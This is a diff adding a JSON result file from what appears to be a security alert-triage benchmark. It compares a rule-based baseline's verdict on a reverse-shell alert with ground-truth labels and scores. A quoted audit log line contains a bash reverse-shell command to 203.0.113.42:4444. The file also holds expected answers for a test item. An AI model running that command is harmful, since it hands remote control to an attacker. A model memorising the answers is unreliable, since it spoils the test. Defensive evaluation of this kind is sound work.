@@ -1,0 +1,72 @@
+{
+  "alert_id": "eval-015",
+  "category": "malware_c2",
+  "ground_truth": {
+    "is_true_positive": true,
+    "expected_severity": "critical",
+    "expected_response": "escalate",
+    "expected_key_indicators": [
+      "reverse shell",
+      "/dev/tcp/",
+      "203.0.113.42:4444"
+    ],
+    "expected_mitre_tactic": "Execution",
+    "notes": "Active reverse shell to attacker IP"
+  },
+  "mode": "baseline",
+  "model": "baseline_rules",
+  "result": {
+    "summary": "[Baseline] Audit: Suspicious process execution detected. on target-1-compute",
+    "hypothesis": "Rule-based assessment: Audit: Suspicious process execution detected.. Severity high suggests monitor action.",
+    "possible_causes": [
+      "Audit: Suspicious process execution detected.",
+      "MITRE ATT&CK tactic: Execution"
+    ],
+    "key_indicators": [
+      "MITRE techniques: T1059.004",
+      "Log excerpt: type=EXECVE msg=audit(1712438430.000:1235): argc=3 a0=\"bash\" a1=\"-i\" a2=\">& /dev/tcp/203.0.113.42/4444 0>&1\""
+    ],
+    "recommended_checks": [
+      "Verify the command was executed by an authorized user",
+      "Check the destination URL/host against threat intel",
+      "Review the user's recent command history"
+    ],
+    "confidence_note": "Low confidence — rule-based baseline without LLM contextual analysis. This assessment uses only Wazuh metadata and predefined heuristics.",
+    "criticality": {
+      "score": 7,
+      "level": "high",
+      "justification": "Based on Wazuh rule level (12), severity mapping: high → high",
+      "contributing_factors": [
+        "Wazuh rule level: 12",
+        "Rule groups: audit, audit_command",
+        "MITRE tactics: Execution"
+      ]
+    },
+    "response": {
+      "action": "monitor",
+      "urgency": "within_1h",
+      "specific_steps": [
+        "Verify the command was executed by an authorized user",
+        "Check the destination URL/host against threat intel",
+        "Review the user's recent command history"
+      ],
+      "escalation_needed": true,
+      "escalation_reason": "Severity high requires attention"
+    }
+  },
+  "raw_response": "[baseline]",
+  "latency_ms": 0,
+  "prompt_tokens": 0,
+  "completion_tokens": 0,
+  "schema_valid": true,
+  "scores": {
+    "severity_match": false,
+    "response_match": false,
+    "indicator_coverage": 0.333,
+    "false_positive_correct": null,
+    "predicted_severity": "high",
+    "expected_severity": "critical",
+    "predicted_action": "monitor",
+    "expected_action": "escalate"
+  }
+}
